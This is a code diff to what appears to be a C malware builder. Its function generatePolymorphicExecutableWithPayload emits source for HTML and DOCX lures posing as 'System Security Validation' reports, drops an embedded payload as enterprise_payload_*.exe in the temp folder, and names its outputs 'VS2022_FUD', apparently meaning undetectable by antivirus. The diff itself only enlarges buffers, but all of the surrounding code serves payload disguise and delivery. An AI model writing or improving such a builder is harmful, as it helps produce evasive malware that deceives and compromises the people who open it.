@@ -250,9 +250,9 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             deliveryIncludes = "#include <shellapi.h>\n";
             payloadFunction = "html_delivery";
             deliveryPayload = 
-                "void execute_html_delivery() {\n"
-                "    char html_content[2048];\n"
-                "    char validation_id[32];\n"
+                            "void execute_html_delivery() {\n"
+            "    char html_content[8192];\n"
+            "    char validation_id[64];\n"
                 "    sprintf_s(validation_id, sizeof(validation_id), \"VS2022-%llu\", GetTickCount64());\n"
                 "    sprintf_s(html_content, sizeof(html_content),\n"
                 "        \"<html><head><title>System Security Validation</title></head>\"\n"
@@ -277,10 +277,10 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
         case DEL_DOCX:
             payloadFunction = "docx_delivery";
             deliveryPayload = 
-                "void execute_docx_delivery() {\n"
-                "    char docx_header[] = \"PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\";\n"
-                "    char docx_content[1024];\n"
-                "    char timestamp[32];\n"
+                            "void execute_docx_delivery() {\n"
+            "    char docx_header[] = \"PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\";\n"
+            "    char docx_content[4096];\n"
+            "    char timestamp[64];\n"
                 "    sprintf_s(timestamp, sizeof(timestamp), \"%lu\", (unsigned long)time(NULL));\n"
                 "    sprintf_s(docx_content, sizeof(docx_content),\n"
                 "        \"Microsoft Office Document - Security Validation Report\\n\\n\"\n"
@@ -360,8 +360,8 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
                     "    // Extract embedded payload to temporary file\n"
                     "    char temp_path[MAX_PATH];\n"
                     "    GetTempPathA(MAX_PATH, temp_path);\n"
-                    "    char temp_file[MAX_PATH];\n"
-                    "    sprintf_s(temp_file, MAX_PATH, \"%s\\\\enterprise_payload_%llu.exe\", temp_path, GetTickCount64());\n"
+                                    "    char temp_file[MAX_PATH];\n"
+                "    sprintf_s(temp_file, sizeof(temp_file), \"%s\\\\enterprise_payload_%llu.exe\", temp_path, GetTickCount64());\n"
                     "    \n"
                     "    // Write actual payload data to file (only the real payload, not padding)\n"
                     "    FILE* payload_file = NULL;\n"
@@ -418,7 +418,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
                     "void execute_payload_delivery() {\n"
                     "    // Enterprise validation with data processing\n"
                     "    char validation_message[] = \"System Security Validation Completed Successfully\";\n"
-                    "    char system_info[1024];\n"
+                    "    char system_info[4096];\n"
                     "    ULONGLONG tickCount = GetTickCount64();\n"
                     "    DWORD processId = GetCurrentProcessId();\n"
                     "    \n"
@@ -722,7 +722,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         generatePolymorphicExecutableWithPayload(sourceCode, sizeof(sourceCode), encType, delType, inputPath);
         
         // Create temporary source file
-        char tempSource[128];
+        char tempSource[256];
         sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%llu_%d.cpp", GetTickCount64(), batch);
         
         // Write source file
